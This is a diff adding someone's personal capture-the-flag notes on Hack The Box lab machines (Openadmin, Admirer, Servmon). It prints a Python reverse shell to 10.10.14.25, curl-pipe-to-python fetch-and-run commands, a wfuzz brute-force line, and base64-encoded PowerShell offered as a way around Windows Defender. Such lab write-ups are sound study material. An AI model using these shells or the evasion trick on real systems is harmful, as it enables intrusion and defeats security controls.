@@ -1,0 +1,113 @@
+HTB
+
+Linux
+------
+
+
+Openadmin
+
+Enum
+-------------
+
+Checking  the sites,we found all the pages are HTML, no php pages. 
+Clicking on login button takes to ona web page (openadmin)
+
+Got the reverse shell .
+
+Now we want full reverse shell. we tried python,bash,perl , but nothing works.
+
+But then we copied the python revesrse shell in rev.py and the call the reverse shell via curl and push the rev.py into python. like this:
+
+root@kali:~/htb/boxes/openadmin# cat rev.py 
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
+root@kali:~/htb/boxes/openadmin# 
+
+$ curl http://10.10.14.25/rev.py | python3
+
+
+We tried like 
+
+
+curl http://10.10.14.25/rev.py | bash
+curl http://10.10.14.25/rev.py | python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+but it didnt works.
+
+
+From there, we got the root shell.
+
+-------------------------------------------------------------------------------------------------
+
+
+
+
+Admirer
+-------
+
+Lots of enumeration ( bascially directory enumeration)
+Found FTP password
+Found db sql file and compresses HTTP
+From HTTP ,found script under utility- directory and more crendentiald directory.
+From there, did directory enumeration under utiltiy directory again and found adminer.php file.
+
+As per search, we need to create the database and connect to ourr database from adminer.php database manager.
+
+
+For priv esc, we have, python path reset. 
+
+Findings
+-----------
+
+I learnt here to use wfuzz(wfuzz -c -u http://admirer.htb/admin-dir/FUZZ.FUZ2Z  -w /usr/share/dirb/wordlists/big.txt -w ext --hc 403,404 
+) for directory enumeration  and to use wordlist "/usr/share/dirb/wordlists/big.txt" for directory enumeration.
+
+
+
+
+
+
+
+
+
+Windows
+-------------------------------------------------------------------------------------------------------
+
+
+Servmon
+---------
+
+Enum
+-----
+
+FTP access gives the path for password file.
+NVSM-1000 exploit via directry traversal, wwe got the creds.
+Trying those creds for ssh access for one of the use and we got in
+From there , found NSSCLIENT and its password.
+Port forward via ~C to Kali machine.
+Tried to transfer the binaries to victim machine, but failed because of defendeer, but the same works via curl.
+Tred running encoded powershell command to understand how to works and also to bypass the defender and any blacklisted command.
+
+
+Findings
+---------
+
+when downloading the file via smbserver, defender blocked it. When downloading the same file via curl, it was allowed.
+Also came to use the powershell encoded command,like 
+
+echo 'ping 10.10.10.13' | iconv -t utf-16le | base64 -w 0
+echo powershell -enc cABpAG4AZwAgADEAMAAuADEAMAAuADEANAAuADIANQAKAA== > ping.bat
+
+When you run >ping.bat, it will ping the system.
+
+
+For reverse shell, one line powershell rever tcp wll help to encode and then you can run like above.
+
+
+
+
+Remote
+-------
+
+
+
